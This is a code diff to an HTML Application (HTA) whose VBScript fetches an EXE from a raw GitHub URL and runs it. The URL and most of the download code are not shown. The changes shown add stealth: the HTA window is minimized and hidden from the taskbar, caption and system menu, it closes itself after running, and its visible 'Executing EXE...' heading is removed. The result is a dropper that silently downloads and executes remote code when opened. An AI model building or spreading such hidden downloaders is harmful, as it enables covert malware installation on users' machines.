@@ -1,6 +1,14 @@
 <html>
 <head>
   <title>Execute EXE from HTA</title>
+  <HTA:APPLICATION
+    ID="HiddenHTA"
+    APPLICATIONNAME="HiddenHTA"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    CAPTION="no"
+    SYSMENU="no"
+  />
   <script language="VBScript">
     Sub RunExe
       ' Raw GitHub URL to the EXE file
@@ -38,11 +46,13 @@
       Else
         MsgBox "Failed to download the EXE file.", vbCritical, "Error"
       End If
+
+      ' Close the HTA window
+      window.Close
     End Sub
   </script>
 </head>
 <body>
-  <h1>Executing EXE...</h1>
   <script language="VBScript">
     RunExe
   </script>
